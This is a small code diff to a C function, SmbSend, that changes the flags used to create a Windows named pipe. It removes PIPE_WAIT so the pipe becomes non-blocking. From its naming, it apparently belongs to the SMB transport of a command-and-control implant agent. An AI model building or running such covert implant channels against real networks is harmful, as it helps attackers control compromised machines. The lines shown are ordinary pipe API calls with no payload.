@@ -48,8 +48,8 @@ BOOL SmbSend(PPackage package)
 				xenonConfig->SmbPipename,		 // Named pipe string
 				PIPE_ACCESS_DUPLEX,              // read/write access
 				PIPE_TYPE_MESSAGE     |          // message type pipe
-				PIPE_READMODE_MESSAGE |          // message-read mode
-				PIPE_WAIT,                       // blocking mode
+				PIPE_READMODE_MESSAGE,           // message-read mode
+				// PIPE_WAIT,                    // blocking mode
 				PIPE_UNLIMITED_INSTANCES,        // max. instances
 				PIPE_BUFFER_MAX,                 // output buffer size
 				PIPE_BUFFER_MAX,                 // input buffer size
